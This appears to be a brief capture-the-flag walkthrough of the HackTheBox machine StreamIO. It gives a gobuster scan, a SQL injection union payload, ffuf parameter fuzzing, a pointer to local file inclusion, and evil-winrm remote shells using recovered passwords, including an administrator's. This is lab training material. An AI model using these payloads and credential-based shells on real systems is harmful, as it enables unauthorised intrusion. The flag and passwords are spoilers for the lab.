### 10-Apr-24-Wed

[StreamIO | HackTheBox](https://app.hackthebox.com/machines/StreamIO)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/204ee319-d3a9-4a69-9e02-5173ef819f78)

https://watch.streamio.htb/

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/d25ab733-d4e5-45d3-a9ca-84f4fb480295)

https://streamio.htb/

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/52a3f29b-2a87-438d-890a-4e5818aa47c1)

https://streamio.htb/about.php

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/501af516-8946-4fa7-8785-45fdf29f949f)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/53101010-1467-4d83-b9ec-5c541f2256b9)

```
gobuster dir -u https://watch.streamio.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -x php
```

https://watch.streamio.htb/search.php

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/d7e3ae36-f14e-4f6e-8842-451cf00f2e9a)

```
10' union select 1,2,3,4,5,6 -- -
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/d342771b-ead6-4ce9-970a-5868203e21ad)

https://streamio.htb/admin/

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/ca00d9a9-26e4-4884-84fb-d77ebd460098)

https://streamio.htb/admin/?user=

https://streamio.htb/admin/?staff=

https://streamio.htb/admin/?movie=

https://streamio.htb/admin/?message=

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/f633915c-1131-4d14-a698-a92ef575c1d0)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/91ed6672-3530-4d10-a841-a3002f2c4cca)

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'https://streamio.htb/admin/?FUZZ=' -b PHPSESSID=oppf80usq814frvij7kngtc4qu --fs 1678
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/6f360eda-9cd8-40ab-b06f-243dc0fd85c3)

https://streamio.htb/admin/?debug=

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/61490368-9ed5-4c9e-a4ec-92c675bbd00b)

[LFI Cheat Sheet](https://highon.coffee/blog/lfi-cheat-sheet/)





```
crackmapexec winrm streamio.htb -u nikk37 -p 'get_dem_girls2@yahoo.com'
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/14ddd8bb-b390-4941-94d5-1473bdc4430d)

```
evil-winrm -i streamio.htb -u nikk37 -p 'get_dem_girls2@yahoo.com'
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/70d82f9f-610a-4a79-9f95-9a5fd6d15bf0)

```
c598605d1a7a76839eb04e8026677386
```

```
evil-winrm -i streamio.htb -u administrator -p '-6/8RYZp4hY6t)'
```

